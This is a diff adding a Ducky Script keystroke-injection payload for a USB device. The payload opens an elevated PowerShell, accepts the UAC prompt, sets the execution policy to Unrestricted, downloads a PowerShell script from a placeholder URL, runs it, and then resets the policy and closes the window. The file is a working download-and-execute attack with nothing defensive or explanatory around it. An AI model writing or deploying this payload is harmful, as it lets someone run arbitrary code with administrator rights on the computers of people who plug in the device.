@@ -1,0 +1,42 @@
+REM Initial delay to allow the computer to recognize the USB device
+DELAY 3000
+
+REM Open PowerShell with admin privileges
+GUI r
+DELAY 500
+STRING powershell Start-Process PowerShell -Verb RunAs
+ENTER
+DELAY 2000
+
+REM Confirm the UAC prompt if required (this step might be skipped depending on security settings)
+ALT y
+DELAY 1000
+
+REM Change Execution Policy temporarily to allow script execution
+STRING Set-ExecutionPolicy Unrestricted -Force
+ENTER
+DELAY 1000
+
+REM Download the PS1 file using Invoke-WebRequest
+STRING $url = '<FILE_PATH>'; $outFile = 'C:\Users\Public\Downloads\example.ps1';
+STRING Invoke-WebRequest -Uri $url -OutFile $outFile
+ENTER
+DELAY 1000
+
+REM Execute the downloaded script
+STRING PowerShell -File $outFile
+ENTER
+DELAY 1000
+
+REM Optionally, reset the execution policy if needed
+STRING Set-ExecutionPolicy Restricted -Force
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
+DELAY 500
+STRING exit
+ENTER
+ 
